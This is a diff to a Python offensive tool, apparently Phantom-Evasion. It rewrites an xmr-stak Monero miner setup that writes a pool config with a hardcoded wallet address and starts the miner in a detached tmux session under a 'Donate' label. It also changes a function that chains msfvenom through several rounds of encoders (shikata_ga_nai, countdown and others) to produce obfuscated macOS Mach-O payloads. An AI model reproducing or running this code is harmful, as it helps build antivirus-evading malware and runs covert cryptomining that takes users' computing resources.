@@ -369,15 +369,11 @@ def xmr_setup():
             new_conf+=line
         new_conf+="Mining=True\n"
         new_conf+="Username=" + username + "\n" 
+
     with open("Setup/Config.txt", "w") as config:
         config.write(new_conf)
 
     miner_config2 = ""
-    miner_config2 += "\"pool_list\" :\n"
-    miner_config2 += "[\n"
-    miner_config2 += "	{\"pool_address\" : \"gulf.moneroocean.stream:10001\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
-    miner_config2 += "],\n"
-    miner_config2 += "\"currency\" : \"monero\",\n"
     miner_config2 += "\"call_timeout\" : 10,\n"
     miner_config2 += "\"retry_time\" : 30,\n"
     miner_config2 += "\"giveup_limit\" : 0,\n"
@@ -397,6 +393,16 @@ def xmr_setup():
 
     with open("Setup/Donate/xmr-stak/build/bin/config.txt", "w") as xmrconfig:
         xmrconfig.write(miner_config2)
+
+    pool_config = ""
+    pool_config += "\"pool_list\" :\n"
+    pool_config += "[\n"
+    pool_config += "	{\"pool_address\" : \"gulf.moneroocean.stream:10001\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\",\"rig_id\" : \"\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
+    pool_config += "],\n"
+    pool_config += "\"currency\" : \"monero7\",\n"
+
+    with open("Setup/Donate/xmr-stak/build/bin/pools.txt", "w") as poolconfig:
+        poolconfig.write(pool_config)
 
     cpu_config = ""
     cpu_config += "\"cpu_threads_conf\" :\n"
@@ -516,7 +522,7 @@ def xmr_miner():
 
     subprocess.call(['tmux','send-keys','-t','phantom-miner','\"\x03\"','C-m'], stdout=open(os.devnull,'wb'), stderr=open(os.devnull,'wb'))
     sleep(0.25)
-    os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 
+    os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt -C Setup/Donate/xmr-stak/build/bin/pools.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 
 
 def pytherpreter_completer(module_type,wine):
     clear()
@@ -1163,11 +1169,11 @@ def powershell_launcher2(module_choice):
 def osx_cascade_encoding():
     py_version=platform.python_version()
     if py_version[0] == "3":     
-        osx_payload = input("\n[>] Enter msfvenom osx 64 bit payload : ")
+        osx_payload = input("\n[>] Enter msfvenom osx 32 bit payload : ")
     else:
-        osx_payload = raw_input("\n[>] Enter msfvenom osx 64 bit payload : ")
+        osx_payload = raw_input("\n[>] Enter msfvenom osx 32 bit payload : ")
 
-    encoder_list = ["x86/countdown","x64/xor","x86/fnstenv_mov","x86/jmp_call_additive","x86/call4_dword_xor"]
+    encoder_list = ["x86/countdown","x86/shikata_ga_nai","x86/fnstenv_mov","x86/jmp_call_additive","x86/call4_dword_xor"]
     shuffle(encoder_list)
     numb_iter1=str(random.randint(2,4))
     numb_iter2=str(random.randint(2,4))
@@ -1217,14 +1223,14 @@ def osx_cascade_encoding():
         macho_filename = input("\n[>] Enter output filename: ")
     else:
         macho_filename = raw_input("\n[>] Enter output filename: ")
-    macho_filename = macho_filename + ".dmg"
-    print (bcolors.GREEN + "\n[>] Generating cascade-encoded Mach-o ...\n" + bcolors.ENDC)
+    macho_filename = macho_filename + ".macho"
+    print (bcolors.GREEN + "\n[>] Generating multi-encoded Mach-o ...\n" + bcolors.ENDC)
 
     if platform.system() == "Windows":
         
-        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x64','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE,shell=True) 
-        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE,shell=True)
-        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_2.stdout, stdout=subprocess.PIPE,shell=True)
+        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x86','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE,shell=True) 
+        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE,shell=True)
+        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_2.stdout, stdout=subprocess.PIPE,shell=True)
 
         round_1.wait() 
         round_2.wait() 
@@ -1232,11 +1238,11 @@ def osx_cascade_encoding():
     else:
         
         round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x64','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE) 
-        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE)
-        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc3,'-i',numb_iter3,'-f','raw'], stdin=round_2.stdout, stdout=subprocess.PIPE)
-        round_4 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc4,'-i',numb_iter4,'-f','raw'], stdin=round_3.stdout, stdout=subprocess.PIPE)
-        round_5 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc5,'-i',numb_iter5,'-f','raw'], stdin=round_4.stdout, stdout=subprocess.PIPE)
-        round_6 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_5.stdout, stdout=subprocess.PIPE)
+        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE)
+        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc3,'-i',numb_iter3,'-f','raw'], stdin=round_2.stdout, stdout=subprocess.PIPE)
+        round_4 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc4,'-i',numb_iter4,'-f','raw'], stdin=round_3.stdout, stdout=subprocess.PIPE)
+        round_5 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc5,'-i',numb_iter5,'-f','raw'], stdin=round_4.stdout, stdout=subprocess.PIPE)
+        round_6 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_5.stdout, stdout=subprocess.PIPE)
 
         round_1.wait() 
         round_2.wait() 
